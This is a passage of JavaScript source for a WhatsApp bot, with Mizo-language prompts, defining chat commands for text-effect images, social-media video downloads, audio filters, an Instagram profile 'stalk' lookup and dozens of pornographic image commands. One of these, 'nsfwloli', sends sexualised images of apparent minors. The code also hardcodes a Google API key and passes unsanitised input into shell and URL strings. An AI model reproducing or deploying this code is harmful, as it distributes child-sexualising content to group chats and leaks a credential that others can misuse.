if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/break-wall-text-effect-871.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break 
case 'carbon':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/carbon-text-effect-833.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'whitebear':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'metallic':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/create-a-metallic-text-effect-free-online-1041.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'steel':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/steel-text-effect-online-921.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'fabric':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/fabric-text-effect-online-964.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
case 'ancient':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Hello World`)
await makerreact()
 mumaker.textpro("https://textpro.me/3d-golden-ancient-text-effect-online-free-1060.html", [
    `${q}`,])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
   case 'marvelstd':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
 mumaker.textpro("https://textpro.me/create-logo-style-marvel-studios-online-971.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
   case 'marvel':
if(!q) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} Herbert|Suantak`)
await makerreact()
teks1 = q.split("|")[0]
teks2 = q.split("|")[1]
 mumaker.textpro("https://textpro.me/create-logo-style-marvel-studios-ver-metal-972.html", [
    `${teks1}`,`${teks2}`])
  .then((data) => HBWABotInc.sendMessage(m.chat, { image: {url: data.image},caption: `A genarate-tu hi ${global.botname} ka ni e.!! ` }, { quoted: m }))
  await finishreact()
  .catch((err) => console.log(err));
   break
   
case 'bible': case 'bq': case 'bible-quotes': 
const bible = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Media/main/QuotesMizo/BibleQuote.json')
const mizo_bible = bible[Math.floor(Math.random() * bible.length)]
const thuziak = `${mizo_bible}`
return replymizobiblequotes(thuziak)         
break
case 'thuril': {
                let mizoquotes = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Media/main/QuotesMizo/mizoquotes.json')
                let random = mizoquotes[Math.floor(Math.random() * mizoquotes.length)]
                HBWABotInc.sendMessage(m.chat, { image: { url: random.quotesmizo }, caption: `${random.number}\n*Author* : ${random.author}\n\n*Instagram* : ${random.instagram}\n\n*Generated by: ©${random.hbwabot}*` }, { quoted: m })
            }
	    break 
case 'couplepp': case 'ppcouple': {
                await loading()
                let anucpp = await fetchJson('https://raw.githubusercontent.com/HBMods-OFC/Media/main/couplepp/Inkawp.json')
                let random = anucpp[Math.floor(Math.random() * anucpp.length)]
                HBWABotInc.sendMessage(m.chat, { image: { url: random.male }, caption: `Mipa` }, { quoted: m })
                HBWABotInc.sendMessage(m.chat, { image: { url: random.female }, caption: `Hmeichhia` }, { quoted: m })
                
            }
	    break
case 'description' : case 'gpdesc': case 'desc': {
if (!m.isGroup) return m.reply(mess.group)
if (!isBotAdmins) return m.reply(mess.botAdmin)
let metadata = await HBWABotInc.groupMetadata(m.chat)
HBWABotInc.sendMessage(from, { text : `*${metadata.subject}\n\n*Group Description :*\n${metadata.desc}`},{ quoted: m})
}
break
          case 'emojimix': {
		let [emoji1, emoji2] = text.split`+`
		if (!emoji1) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} 😅+🤔`)
		if (!emoji2) return replyherbertstyle(`Tiang hian tih tur : ${prefix + command} 😅+🤔`)
		let anumojimix = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
		for (let res of anumojimix.results) {
		    let encmedia = await HBWABotInc.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
		    
		}
	    }
	    break
	case 'hentaivid2': {
if (!m.isGroup) return m.reply(mess.group)

if (!AntiNsfw) return replygherbert(mess.nsfw)
await loading()
sbe = await hentaivid()
cejd = sbe[Math.floor(Math.random(), sbe.length)]
HBWABotInc.sendMessage(m.chat, { video: { url: cejd.video_1 }, 
caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}` }, { quoted: m })

}
break
	case 'hentaivid': case 'hentaivideo': {
	if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
                await loading()
                const { hentai } = require('./lib/scraper.js')
                anu = await hentai()
                result912 = anu[Math.floor(Math.random(), anu.length)]
                HBWABotInc.sendMessage(m.chat, { video: { url: result912.video_1 }, caption: `${themeemoji} Title : ${result912.title}\n${themeemoji} Category : ${result912.category}\n${themeemoji} Mimetype : ${result912.type}\n${themeemoji} Views : ${result912.views_count}\n${themeemoji} Shares : ${result912.share_count}\n${themeemoji} Source : ${result912.link}\n${themeemoji} Media Url : ${result912.video_1}` }, { quoted: m })
                
            }
            break
case 'trap' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url:waifudd.data.url } }, { quoted: m })

break
case 'hentai-neko' :
case 'hneko' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url:waifudd.data.url } }, { quoted: m })
break
case 'hentai-waifu' :
case 'nwaifu' :
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url:waifudd.data.url } }, { quoted: m })

break
case 'gasm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url:waifudd.data.url } }, { quoted: m })

break  
case 'animespank':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            await HBWABotInc.sendMessage(m.chat, { caption:  "\n*©HBWABot*", image: {url:waifudd.data.url} },{ quoted:m })
break
case 'ahegao':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ahegao.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'ass':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ass.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'bdsm':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/bdsm.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'blowjob':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/blowjob.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'cuckold':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cuckold.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'cum':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/cum.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'eba':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/eba.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'ero':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/ero.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'femdom':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/femdom.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'foot':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/foot.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'gangbang':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gangbang.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'glasses':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/glasses.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/hentai.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'jahy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/jahy.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'manga':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/manga.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'masturbation':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/masturbation.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'neko-hentai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'neko-hentai2':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/neko2.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'nsfwloli':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/nsfwloli.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'orgy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/orgy.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'panties':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/panties.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'pussy':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/pussy.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'tentacles':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/tentacles.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'thighs':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/thighs.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'yuri':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/yuri.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'zettai':
if (!m.isGroup) return m.reply(mess.group)
	if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
await loading()
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/zettai.json'))
var herbertyresult = pickRandom(ahegaonsfw)
HBWABotInc.sendMessage(m.chat, { caption: "\n*©HBWABot*", image: { url: herbertyresult.url } }, { quoted: m })

break
case 'gifblowjob':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    await HBWABotInc.sendMessage(m.chat,{video:bogif, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'gifhentai':
if (!m.isGroup) return m.reply(mess.group)
if (!AntiNsfw) return replyherbertstyle(mess.nsfw)
var ahegaonsfw = JSON.parse(fs.readFileSync('./HostMedia/nsfw/gifs.json'))
var herbertyresultx = pickRandom(ahegaonsfw)
    await HBWABotInc.sendMessage(m.chat,{video:herbertyresultx, gifPlayback:true },{quoted:m}).catch(err => {
    })
    break
case 'animeavatar': {
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`)     
            await HBWABotInc.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: "\n*©HBWABot*"},{ quoted:m }).catch(err => {
                    return('Error!')
                })
                }
break
 case 'tinyurl':{
   if(!q) return replyherbertstyle(`A link rawn dah rawh..!\nTiang hian tih tur :\n${prefix}${command} https://www.youtube.com/@HBMods_Channel`)
   const request = require('request')
   request(`https://tinyurl.com/api-create.php?url=${q}`, function (error, response, body) {
   try {
  replyherbertstyle(body)
  } catch (e) {
  replyherbertstyle(e)
  }
  })
  }
 break
case 'git': case 'gitclone':
if (!args[0]) return replyherbertstyle(`A link rawn dah rawh..!\nTiang hian tih tur :\n${prefix}${command} https://github.com/Hello/HBMedia`)
if (!isUrl(args[0]) && !args[0].includes('github.com')) return replyherbertstyle(`link a dik lo!!`)
let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
    let [, user, repo] = args[0].match(regex1) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    HBWABotInc.sendMessage(m.chat, { document: { url: url }, fileName: filename, mimetype: 'application/zip' }, { quoted: m }).catch((err) => replyherbertstyle(mess.error))
break
case 'bass': case 'blown': case 'deep': case 'earrape': case 'fast': case 'fat': case 'nightcore': case 'reverse': case 'robot': case 'slow': case 'smooth': case 'squirrel':
                try {
                let set
                if (/bass/.test(command)) set = '-af equalizer=f=54:width_type=o:width=2:g=20'
                if (/blown/.test(command)) set = '-af acrusher=.1:1:64:0:log'
                if (/deep/.test(command)) set = '-af atempo=4/4,asetrate=44500*2/3'
                if (/earrape/.test(command)) set = '-af volume=12'
                if (/fast/.test(command)) set = '-filter:a "atempo=1.63,asetrate=44100"'
                if (/fat/.test(command)) set = '-filter:a "atempo=1.6,asetrate=22100"'
                if (/nightcore/.test(command)) set = '-filter:a atempo=1.06,asetrate=44100*1.25'
                if (/reverse/.test(command)) set = '-filter_complex "areverse"'
                if (/robot/.test(command)) set = '-filter_complex "afftfilt=real=\'hypot(re,im)*sin(0)\':imag=\'hypot(re,im)*cos(0)\':win_size=512:overlap=0.75"'
                if (/slow/.test(command)) set = '-filter:a "atempo=0.7,asetrate=44100"'
                if (/smooth/.test(command)) set = '-filter:v "minterpolate=\'mi_mode=mci:mc_mode=aobmc:vsbmc=1:fps=120\'"'
                if (/squirrel/.test(command)) set = '-filter:a "atempo=0.5,asetrate=65100"'
                if (/audio/.test(mime)) {
                await loading()
                let media = await HBWABotInc.downloadAndSaveMediaMessage(quoted)
                let ran = getRandom('.mp3')
                exec(`ffmpeg -i ${media} ${set} ${ran}`, (err, stderr, stdout) => {
                fs.unlinkSync(media)
                if (err) return replyherbertstyle(err)
                let buff = fs.readFileSync(ran)
                HBWABotInc.sendMessage(m.chat, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : m })
                fs.unlinkSync(ran)
                
                })
                } else replyherbertstyle(`Audio i change duh chu *${prefix + command}* tiin reply rawh`)
                } catch (e) {
                replyherbertstyle(e)
                }
                break
            case 'runtime': {
            	let lowq = `*Bot hi:*\n*${runtime(process.uptime())} chhung a online tawh a ni..*`
                replyherbertstyle(lowq)
            	}
            break
            case 'wallpaper': {
                if (!text) return replyherbertstyle('A title rawn dah rawh!..')
                await loading()
		let { wallpaper } = require('./lib/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]                
                HBWABotInc.sendMessage(m.chat, {caption: `${themeemoji} Title : ${result.title}\n${themeemoji} Category : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}`, image: { url: result.image[0] }} , { quoted: m })
                
            }
            break
case 'igvid':
case 'instavid': 
case 'igstory':
case 'igreels': {
  // Credit by Betabotz-tools
  if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://www.instagram.com/reel/Cv83HHYtC-Y/?igshid=NTc4MTIwNjQ2YQ==`);
  await loadingreact();
  const { instagram } = require('betabotz-tools');
  const url = args[0];
  const results = await instagram(url);
  console.log(results); // JSON
  await uploadreact();
  for (let i of results.result) {
    await HBWABotInc.sendMessage(m.chat, {
      video: { url: i._url },
      caption: "Instagram download by HBWABot"
    }, { quoted: m });
  }
  await finishreact();
}
break;
case 'igvid2' : case 'indtavid2':  {
  if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://www.instagram.com/reel/Cv83HHYtC-Y/?igshid=NTc4MTIwNjQ2YQ==`)
  await loadingreact()
const { igdl } = require('btch-downloader')
const url = args[0]
const uite = await igdl(url)
console.log(uite) // JSON
await uploadreact()
for (let mimawl of uite.url) {
    await HBWABotInc.sendMessage(m.chat, {
    video: { url: mimawl },
    caption: "Instagram download by HBWABot"
}, { quoted: m });
  }
await finishreact()
}
break 
 case 'instavid3' : case 'igvid3': 
if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://www.instagram.com/p/ByxKbUSnubS/?utm_source=ig_web_copy_link`)
await loadingreact()
 mumaker.instagram(`${args[0]}`)
  .then((data) => HBWABotInc.sendMessage(m.chat, { video: { url: data }, caption: `Instagram Videos download by HBWABot` }, { quoted: m }))
  .catch((err) => console.log(err))
  await finishreact()
   break
   
case 'tiktokvid' : case 'ttvid': 
if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://www.tiktok.com/@omagadsus/video/7025456384175017243?is_from_webapp=1&sender_device=pc&web_id6982004129280116226`)
await loadingreact()
 mumaker.tiktok(`${args[0]}`)
  .then((data) => HBWABotInc.sendMessage(m.chat, { video: { url: data.media }, caption: `Tiktok Videos download by HBWABot` }, { quoted: m }))
  .catch((err) => console.log(err))
  await finishreact()
   break
  case 'tiktokvidxx' : case 'ttvidxx':  {
  if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://www.tiktok.com/@omagadsus/video/7025456384175017243?is_from_webapp=1&sender_device=pc&web_id6982004129280116226`)
  await loadingreact()
  const { ttdl } = require('btch-downloader') 
    const link = args[0] 
    const data = await ttdl(link) 
    console.log(data)
    await uploadreact()
await HBWABotInc.sendMessage(m.chat,{
video: {url: data.video},
caption: "Tiktok Videos download by HBWABot"
}, {quoted:m})
await finishreact()

}
break
   
case 'fbvidxx' : case 'facebookvidxx':  {
  if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://fb.watch/mcx9K6cb6t/?mibextid=8103lRmnirLUhozF`)
  await loadingreact()
  const { fbdown } = require('btch-downloader') 
    const link = args[0] 
    const data = await fbdown(link) 
    console.log(data)
    await uploadreact()
await HBWABotInc.sendMessage(m.chat,{
video: {url: data.Normal_video},
caption: "Facebook Videos download by HBWABot"
}, {quoted:m})
await finishreact()

}
break 
case 'fbvid' : case 'facebookvid':  {
  if (!text) return replyherbertstyle(`A link rawn dah tel rawh\n\nTiang hian: ${prefix + command} https://fb.watch/mcx9K6cb6t/?mibextid=8103lRmnirLUhozF`)
  await loadingreact()
const { facebook } = require('betabotz-tools') 
const url = args[0]
const results = await facebook(url)
console.log(results) // JSON
await uploadreact()
await HBWABotInc.sendMessage(m.chat,{
video: {url: results.result.hd_q},
caption: "Facebook Video download by HBWABot"
}, {quoted:m})
await finishreact()
}
break 

case 'setppbot': case 'setbotpp': {
if (!HerbertTheCreator) return m.reply(mess.owner)
if (!quoted) return replyherbertstyle(`Send emaw reply in a caption ah tiang hian rawn dah rawh: ${prefix + command}`)
if (!/image/.test(mime)) return replyherbertstyle(`Send emaw reply in a caption ah tiang hian rawn dah rawh : ${prefix + command}`)
if (/webp/.test(mime)) return replyherbertstyle(`Send emaw reply in a caption sh tiang hian rawn dah rawh : ${prefix + command}`)
var dptur = await HBWABotInc.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
if (args[0] == `full`) {
var { img } = await reSize(dptur)
await HBWABotInc.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(dptur)
replyherbertstyle(`Success`)
} else {
var memeg = await HBWABotInc.updateProfilePicture(botNumber, { url: dptur })
fs.unlinkSync(dptur)
replyherbertstyle(`Success`)
}
}
break
  
case 'igstalk': {
if (!args[0]) return replyherbertstyle(`Instagram Username rawn dah rawh\n\nTiang hian: ${prefix + command} herbert_suantak2`)
await loading()
const fg = require('api-dylux')
    try {
    let res = await fg.igStalk(args[0])
    let te = `
┌──「 *STALKING* 
▢ *🔖Name:* ${res.name} 
▢ *🔖Username:* ${res.username}
▢ *👥Follower:* ${res.followersH}
▢ *🫂Following:* ${res.followingH}
▢ *📌Bio:* ${res.description}
▢ *🏝️Posts:* ${res.postsH}
▢ *🔗 Link* : https://instagram.com/${res.username.replace(/^@/, '')}
└────────────`
     await HBWABotInc.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m})
      } 

catch {
        replyherbertstyle(`A username a dik lo!. a username dik tak rawn dah rawh`)
      }
}
break
    case 'say': case 'tts': case 'gtts':{
if (!text) return replyherbertstyle('word rawn dah rawh')
            let texttts = text
            const herbertrl = googleTTS.getAudioUrl(texttts, {
                lang: "en",
                slow: false,
                host: "https://translate.google.com",
            })
            return HBWABotInc.sendMessage(m.chat, {
                audio: {
                    url: herbertrl,
                },
                mimetype: 'audio/mp4',
                ptt: true,
